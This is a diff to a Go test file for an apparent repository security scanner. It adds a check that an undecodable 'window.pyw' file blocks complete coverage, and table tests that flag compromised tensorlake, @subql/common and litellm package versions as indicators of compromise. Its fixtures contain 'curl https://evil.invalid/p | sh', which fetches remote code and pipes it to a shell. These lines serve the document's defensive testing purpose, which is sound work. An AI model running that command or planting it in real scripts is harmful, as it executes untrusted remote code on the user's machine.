@@ -922,6 +922,7 @@ func TestUndecodableScriptCannotReportCompleteCoverage(t *testing.T) {
 	repo := t.TempDir()
 	writeFixture(t, repo, "run.sh", "#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n")
 	writeFixture(t, repo, "run", "#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n")
+	writeFixture(t, repo, "window.pyw", "text\x00\n")
 	if err := os.WriteFile(filepath.Join(repo, "launch.ps1"), []byte{0xff, 0xfe, 'i', 0, 'e', 0, 'x', 0}, 0o644); err != nil {
 		t.Fatal(err)
 	}
@@ -934,7 +935,7 @@ func TestUndecodableScriptCannotReportCompleteCoverage(t *testing.T) {
 		}
 	}
 	coverage, _ := New(Options{}).Scan(context.Background(), repo)
-	if coverage.Complete || len(coverage.Skipped) < 5 || !strings.Contains(strings.Join(coverage.Skipped, " "), "undecodable") {
+	if coverage.Complete || len(coverage.Skipped) < 6 || !strings.Contains(strings.Join(coverage.Skipped, " "), "window.pyw (undecodable source or configuration)") {
 		t.Fatalf("undecodable script reported complete: %+v", coverage)
 	}
 }
@@ -1026,5 +1027,40 @@ func TestRasterImageTextIsOutsideTextRuleCoverage(t *testing.T) {
 	coverage, findings := New(Options{}).Scan(context.Background(), root)
 	if !coverage.Complete || hasRule(findings, "AGENT-002") || hasRule(findings, "IMAGE-001") {
 		t.Fatalf("raster image coverage contract changed: %+v %+v", coverage, findings)
+	}
+}
+
+func TestOctoberPackageIndicators(t *testing.T) {
+	for _, tc := range []struct {
+		name, path, content, rule, context, message string
+		severity                                    model.Severity
+	}{
+		{"tensorlake transitive native lock", "package-lock.json", `{"lockfileVersion":3,"packages":{"node_modules/parent/node_modules/tensorlake-native-linux-x64-gnu":{"version":"0.5.144"}}}`, "IOC-PKG-GHSA-8g63-53c9-65j2", "confirmed-ioc", "Resolved lockfile version matches", model.SeverityCritical},
+		{"tensorlake safe native lock", "package-lock.json", `{"lockfileVersion":3,"packages":{"node_modules/parent/node_modules/tensorlake-native-linux-x64-gnu":{"version":"0.5.143"}}}`, "IOC-PKG-GHSA-8g63-53c9-65j2", "", "", ""},
+		{"subql compromised lock", "package-lock.json", `{"lockfileVersion":3,"packages":{"node_modules/@subql/common":{"version":"5.8.3"}}}`, "IOC-PKG-FLATT-2026-10-05-SUBQL-COMMON", "confirmed-ioc", "Resolved lockfile version matches", model.SeverityCritical},
+		{"subql safe lock", "package-lock.json", `{"lockfileVersion":3,"packages":{"node_modules/@subql/common":{"version":"5.8.2"}}}`, "IOC-PKG-FLATT-2026-10-05-SUBQL-COMMON", "", "", ""},
+		{"subql manifest range", "package.json", `{"dependencies":{"@subql/common":"^5.8.2"}}`, "IOC-PKG-FLATT-2026-10-05-SUBQL-COMMON", "manifest-review", "could resolve", model.SeverityHigh},
+		{"litellm compromised declaration", "requirements.txt", "litellm==1.107.0\n", "IOC-PKG-GHSA-92x9-889m-jgmw", "manifest-review", "Exact declared version matches", model.SeverityHigh},
+		{"litellm safe declaration", "requirements.txt", "litellm==1.106.2\n", "IOC-PKG-GHSA-92x9-889m-jgmw", "manifest-review", "outside the listed affected versions", model.SeverityHigh},
+		{"litellm manifest range", "requirements.txt", "litellm>=1.106.0\n", "IOC-PKG-GHSA-92x9-889m-jgmw", "manifest-review", "version exposure is unknown", model.SeverityHigh},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			root := t.TempDir()
+			writeFixture(t, root, tc.path, tc.content)
+			_, findings := New(Options{}).Scan(context.Background(), root)
+			matches := 0
+			for _, f := range findings {
+				if f.RuleID != tc.rule {
+					continue
+				}
+				matches++
+				if f.Context != tc.context || f.Severity != tc.severity || !strings.Contains(f.Message, tc.message) {
+					t.Fatalf("unexpected IOC classification: %+v", f)
+				}
+			}
+			if (matches != 0) != (tc.context != "") {
+				t.Fatalf("unexpected IOC presence: %+v", findings)
+			}
+		})
 	}
 }
